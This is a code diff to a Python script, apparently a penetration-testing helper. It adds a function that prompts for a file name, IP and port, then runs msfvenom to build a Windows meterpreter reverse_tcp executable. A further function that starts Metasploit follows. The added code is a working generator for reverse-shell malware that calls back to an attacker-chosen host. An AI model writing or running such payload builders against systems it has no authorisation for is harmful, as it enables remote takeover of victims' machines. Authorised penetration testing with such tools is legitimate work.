@@ -96,6 +96,21 @@ def main():
 
     # Print the output to the console
     print(output)
+    
+    def create_payload():
+        answer = input("Do you want to create a meterpreter payload? (y/n)")
+        if answer == "y":
+           output = input("Enter a name for the output file: ")
+           lHost = input("Choose target IP: ")
+           lPort = input("Choose target port: ")
+           print("Creating payload...")
+           subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output])
+        elif answer == "n":
+            print("Payload not created.")
+        else:
+           print("Invalid input.")
+           
+    create_payload()
 
     def start_metasploit():
         answer = input("Do you want to start Metasploit? (y/n) ")
